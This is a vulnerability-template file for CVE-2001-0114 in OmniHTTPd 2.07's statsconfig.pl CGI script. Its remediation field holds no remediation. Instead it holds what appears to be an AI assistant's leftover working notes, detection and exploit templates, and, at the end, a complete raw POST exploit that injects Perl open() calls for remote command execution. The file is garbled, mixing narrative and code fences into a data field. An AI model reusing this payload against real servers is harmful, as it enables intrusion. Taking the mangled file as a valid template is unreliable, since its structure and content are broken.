[basic]
description = "OmniHTTPd 2.07 的 statsconfig.pl CGI 脚本存在任意文件写入漏洞。远程攻击者可通过 cgidir 参数控制文件写入路径，向服务器任意位置写入恶意文件，进而可能导致远程代码执行。攻击无需认证，通过网络即可发起，危害较大。"
published = "2001-03-12T05:00:00Z"
remediation = '''
[info]
id = "POC-AVE-2001-00001"
name = "CVE-2001-0114 PoC"
author = "AVE"
severity = "high"
tags = ["cve-2001-0114"]
description = "检测 OmniHTTPd 2.07 statsconfig.pl 是否存在"
vuln_id = ["CVE-2001-0114", "AVE-2001-00001"]

[poc]
logic = "any"

[[poc.requests]]
protocol = "http"
method = "GET"
path = "/{{BaseURL}}/cgi-bin/statsconfig.pl"
headers = { "User-Agent" = "AVE/1.0" }

[[poc.requests.matchers]]
type = "status"
status = [200, 500]
expect = true
```

For the EXP, I'll use TCP protocol since the exploit sends raw HTTP POST requests:

```toml
[info]
id = "EXP-AVE-2001-00001"
name = "CVE-2001-0114 EXP"
author = "AVE"
severity = "high"
tags = ["cve-2001-0114"]
description = "OmniHTTPd 2.07 statsconfig.pl 命令注入利用 - 注入 Perl open() 调用实现远程命令执行"
vuln_id = ["CVE-2001-0114", "AVE-2001-00001"]

[poc]
logic = "any"

[[poc.requests]]
protocol = "tcp"
path = "{{Hostname}}:{{Port}}"

[poc.requests.raw]
type = "tcp"
content = "POST /cgi-bin/statsconfig.pl HTTP/1.0\r\nContent-type: application/x-www-form-urlencoded\r\nContent-length: 0\r\n\r\n"

[[poc.requests.matchers]]
type = "word"
words = ["statsconfig"]
expect = true
```

Hmm, actually for the EXP I should use the actual exploit payload. Let me think about this more carefully.

The exploit from EDB-20557 sends a POST request with specific parameters. For the EXP, I should replicate the actual exploit behavior. Let me create a proper TCP-based EXP that sends the injection payload.

Actually, looking at the exploit code more carefully, the injection mode sends:
```
POST /cgi-bin/statsconfig.pl HTTP/1.0
Content-type: application/x-www-form-urlencoded
Content-length: <length>

perllib=<cgipath>/statsconfig.pl%00&cgidir=<cgipath>&deflimit=&mostip=on&mostreq=on&mostbrowsers=on&timelog=on&mostipnum=5&mostreqf=5&mostbrowsernum=5;%20if($ENV{'QUERY_STRING'}){open(QS,$ENV{'QUERY_STRING'});}$a%3D1&logloc=c%3A%2Fhttpd%2Flogs%2Faccess.log&imagebar=%2Fstatsbar.gif&serveradd=%3C%21--%23echo+var%3D&barwidth=100&barheight=5&listpass=&bgcolor=%23FFFFFF&bgimage=&ttBGcolor=%23FFFFDD
'''
